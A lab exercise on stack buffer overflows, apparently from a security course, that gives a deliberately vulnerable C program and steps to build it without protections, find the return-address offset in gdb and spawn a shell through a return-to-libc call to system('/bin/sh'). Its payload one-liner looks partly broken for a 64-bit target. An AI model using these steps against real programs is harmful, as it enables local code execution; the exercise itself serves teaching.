
## Exercise 1 - NX Bit

Consider the following `overflow.c` code:

```C
#include <string.h>

int overflow(char* input){
  char buf[25];
  strcpy(buf, input);
  return 1;  
}

int main(int argc, char** argv){
  overflow(argv[1]);
  return 1;
}
```
- Compile the code disabling every security measure, with the command:
  - `gcc -m64 -fno-stack-protector -no-pie -Wl,-z,norelro overflow.c`
- Enter in a `gdb` session for the binary, run the `checksec` command to check the security measures
  - Is the stack an executable region? Are addresses randomized?
- Generate a pattern of 200 bytes with `pattern create 200`, we will use this to overwrite the `RBP`
  - Set a breakpoint to `strcpy()`, issue the input pattern with `r '[paste_patern]'`
  - Inspect the `RBP` register, get the offset value with `pattern offset [rbp_value]`
  - Add 8 bytes to the offset value, overwrite the `RIP` register with a canonical address.
    - Hint: the `r` command of `gdb` can take input from shell commands: $(command_here), can you use python to generate the string?
  - After controlling the `RIP`, since the stack is not executable, we will reach the function `system()` and pass `"/bin/sh"` to it.
    - Get the address of `system()` in `LIBC` by setting a breakpoint at `main()`, running the binary, then `p system`
    - Search in the `libc` memory for the `"/bin/sh"` string, with the command `find [system_address],+99999999,"/bin/sh"`
    - Run the command `r $(echo python2 -c "print 'A'*[offset+8]+[system_address]+'AAAA'+[/bin/sh_address]")`
  - Make the binary execute a shell by supplying the input string outside the debuuger.
